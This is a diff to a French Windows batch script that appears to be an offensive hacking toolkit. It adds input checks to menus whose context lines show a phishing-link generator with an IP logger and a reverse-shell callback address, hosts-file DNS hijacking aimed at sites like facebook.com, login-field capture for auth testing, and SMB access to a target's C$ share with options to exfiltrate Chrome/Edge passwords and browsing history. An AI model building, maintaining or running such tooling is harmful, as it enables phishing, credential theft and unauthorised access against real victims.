@@ -2161,7 +2161,9 @@ echo   GENERATEUR DE LIEN DE PHISHING (REMOTE)
 echo  ================================================
 echo.
 set /p "webhook=URL de votre IP Logger (ex: Grabify) : "
+if not defined webhook goto net_cyber_menu
 set /p "my_ip=Votre IP Publique (pour le retour shell) : "
+if not defined my_ip goto net_cyber_menu
 echo.
 echo [i] Generation de la page index_phishing.html...
 
@@ -2281,6 +2283,7 @@ if "%rc_opt%"=="3" (
     echo.
     echo [i] Connexion distante SSH...
     set /p "ssh_user=Utilisateur cible : "
+    if not defined ssh_user goto cyber_remote_menu
     if "!remote_port!"=="NONE" (
         ssh !ssh_user!@!remote_ip!
     ) else (
@@ -2592,7 +2595,9 @@ echo   Description : Intercepte les requetes DNS pour 
 echo   envoyer la victime vers ton IP au lieu du vrai site.
 echo.
 set /p "site_cible=Domaine a detourner (ex: facebook.com) : "
+if not defined site_cible goto cyber_mitm_module
 set /p "votre_ip=IP de votre serveur de phishing : "
+if not defined votre_ip goto cyber_mitm_module
 
 echo [i] Configuration de la table de redirection...
 REM On utilise le fichier 'hosts' local pour simuler le poisoning si on est en MITM
@@ -3305,10 +3310,12 @@ if not defined ALEEX_AUTH_URL goto net_cyber_menu
 echo  Nom du champ utilisateur (ex: username, email, login)
 set "ALEEX_AUTH_USER_FIELD="
 set /p "ALEEX_AUTH_USER_FIELD=User Field : "
+if not defined ALEEX_AUTH_USER_FIELD goto net_cyber_menu
 
 echo  Nom du champ mot de passe (ex: password, pass, pwd)
 set "ALEEX_AUTH_PASS_FIELD="
 set /p "ALEEX_AUTH_PASS_FIELD=Pass Field : "
+if not defined ALEEX_AUTH_PASS_FIELD goto net_cyber_menu
 
 set "ATS=%TEMP%\auth_test.ps1"
 if exist "%ATS%" del /f /q "%ATS%"
@@ -6750,6 +6757,7 @@ if "%web_url%"=="" goto smb_exp_menu
 echo [i] Dossiers utilisateurs sur la cible :
 dir "\\%target_ip%\C$\Users" /B /A:D 2^>nul
 set /p "user_target=Utilisateur cible : "
+if not defined user_target goto smb_exp_menu
 echo.
 echo [1] Exfiltrer Mots de passe Chrome/Edge (hashes)
 echo [2] Exfiltrer Historique de navigation
